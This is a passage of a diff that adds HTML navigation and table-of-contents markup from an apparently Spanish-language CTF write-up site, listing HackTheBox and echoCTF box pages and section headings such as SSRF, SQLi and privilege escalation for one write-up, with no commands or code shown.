+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_1" id="__nav_7_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Battlegrounds
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_1">
+            <span class="md-nav__icon md-icon"></span>
+            Battlegrounds
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Battlegrounds/Cyber%20Mayhem/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Cyber Mayhem
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Cyber Mayhem
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Boxes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            Boxes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1" id="__nav_7_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_1" id="__nav_7_2_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    1 Fácil
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            1 Fácil
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Active
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Active
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Devel
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Devel
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_1_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Remote
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Remote
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_2" id="__nav_7_2_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2 Medio
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            2 Medio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/2%20Medio/Chatterbox/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Chatterbox
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Chatterbox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/2%20Medio/Jeeves/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Jeeves
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Jeeves
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_3" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/2%20Medio/SecNotes/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    SecNotes
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            SecNotes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_2_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/2%20Medio/Silo/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Silo
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Silo
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_1_3" id="__nav_7_2_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3 Difícil
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            3 Difícil
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Control/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Control
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Control
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_1_3_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Search
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_2_1_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_2_1_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Search
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3_1" id="__nav_7_3_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Mobile
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Mobile
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_7_3_1_1" id="__nav_7_3_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Medium
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Medium
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_3_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../HackTheBox/Challenges/Mobile/Medium/SeeTheSharpFlag/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    SeeTheSharpFlag
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_7_3_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7_3_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            SeeTheSharpFlag
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    echoCTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            echoCTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Boxes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_8_1">
+            <span class="md-nav__icon md-icon"></span>
+            Boxes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_1" id="__nav_8_1_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2 Básico
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            2 Básico
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../2%20B%C3%A1sico/Flanders/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Flanders
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Flanders
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_1_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../2%20B%C3%A1sico/Smithers/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Smithers
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Smithers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_2" id="__nav_8_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3 Intermedio
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            3 Intermedio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_2_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../3%20Intermedio/Alister/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Alister
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Alister
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_8_1_3" id="__nav_8_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    5 Experto
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_1_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_8_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            5 Experto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1_3_1" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="./" class="md-nav__link md-nav__link--active">
+              
+  
+  <span class="md-ellipsis">
+    Gogo Yubari
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_8_1_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_8_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Gogo Yubari
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#indice" class="md-nav__link">
+    <span class="md-ellipsis">
+      Índice
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduccion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introducción
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introducción">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#estadisticas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Estadísticas
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconocimiento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconocimiento
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconocimiento">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escaneo-de-host" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escaneo de host
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escaneo de host">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escaneo-completo-de-puertos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escaneo completo de puertos
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escaneo-especifico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escaneo específico
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeración
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#servicios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Servicios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Servicios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      http - 8080
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explotación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSRF
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQLi
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-explotacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post Explotación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post Explotación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escalacion-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escalación de privilegios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escalación de privilegios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      mysql &rarr; root
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ubicacion-de-banderas" class="md-nav__link">
